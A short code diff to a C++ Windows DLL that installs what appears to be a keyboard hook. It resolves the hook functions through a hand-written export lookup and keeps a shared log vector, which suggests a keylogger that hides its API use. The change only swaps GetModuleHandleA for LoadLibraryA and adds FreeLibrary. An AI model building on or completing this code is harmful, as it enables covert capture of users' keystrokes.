@@ -7,6 +7,7 @@
 #define DLL_EXPORT __declspec(dllexport)
 ///////////////////////////////////////////////////////////////////////
 
+HMODULE hUser32;
 HHOOK k_Hook;
 std::vector<std::string>* sharedLogVector = nullptr;
 std::mutex logMutex;
@@ -56,7 +57,7 @@ void* FindExportAddress(HMODULE hModule, const char* funcName)
 
 DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
 {
-    HMODULE hUser32 = (HMODULE)GetModuleHandleA("user32.dll");
+    hUser32 = (HMODULE)LoadLibraryA("user32.dll");
     MySetWindowsHookEx = (SetWinHookFn)FindExportAddress(hUser32, "SetWindowsHookExA");
     MyUnhookWindowsHookEx = (UnhookWinHookExFn)FindExportAddress(hUser32, "UnhookWindowsHookEx");
     MyCallNextHookEx = (CallNxtHookExFn)FindExportAddress(hUser32, "CallNextHookEx");
@@ -72,6 +73,7 @@ DLL_EXPORT void Cleanup()
     if (k_Hook) 
     {
         MyUnhookWindowsHookEx(k_Hook);
+        FreeLibrary(hUser32);
         k_Hook = nullptr;
     }
 }
